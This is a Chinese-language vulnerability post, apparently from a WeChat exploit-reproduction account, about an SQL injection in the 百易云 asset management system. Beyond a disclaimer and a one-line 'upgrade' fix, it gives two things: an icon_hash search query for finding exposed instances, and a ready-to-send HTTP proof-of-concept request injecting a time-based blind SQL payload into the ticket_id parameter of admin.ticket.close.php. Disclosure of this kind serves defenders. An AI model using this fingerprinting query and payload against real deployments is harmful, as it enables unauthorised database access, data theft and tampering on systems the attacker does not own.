#  百易云资产管理系统SQL注入漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-22 02:23  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
#   
  
01  
  
—  
  
漏洞名称  
# 百易云资产管理系统SQL注入漏洞  
#   
  
02  
  
—  
  
影响版本  
  
影响百易云资产管  
理系统8.142.1000.161版本  
及可能更早版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2HnDaOos7zSSGYLEn7K0j4JA9DpdM3fnQ3dW6wXyics7xOlElzOlia83B0GCNlEKlqvWXPMYaxnb327qG3S1Fkdib5fWwUX8xiaPQ/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
百易云资产管理系统是一款面向企业不动产及固定资产管理的综合性数字化平台。  
百易云资产管理  
系统  
通过数  
字化手段提  
升资产管理效率，降低运营成本，助力企业实现资产价  
值最大化和数字化转型  
。  
百易云资产管理运营系统存在  
SQL注入漏洞  
攻击者可通过构造恶意参数  
，  
注入SQL代码，实现未授权的数据库操作，如获取敏感数据、修改数据或执行系统命令。  
  
04  
  
—  
  
资产测绘  
```
icon_hash="-300948750" || icon_hash=="-208155332"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0gSc15FZmSqRKvLLLj6gHbHAargOTSCeIXmA2YykQZF3ykPrzWUdss6ftceNuOMhjZgaGdLfA9tJ57mVoZibQJ6QOjGWtmICuc/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /wuser/admin.ticket.close.php?ticket_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(2)))OKTO) HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS11IgIjrHquHiczUUZX7iavpQFgNPmOeTtqTndtuEUAg7NECl3hT5rFKCBIBtCpXuPEqib0AicY4A7ohyuzzKxQazic4o63rxZStTfw/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
  
  
  
  
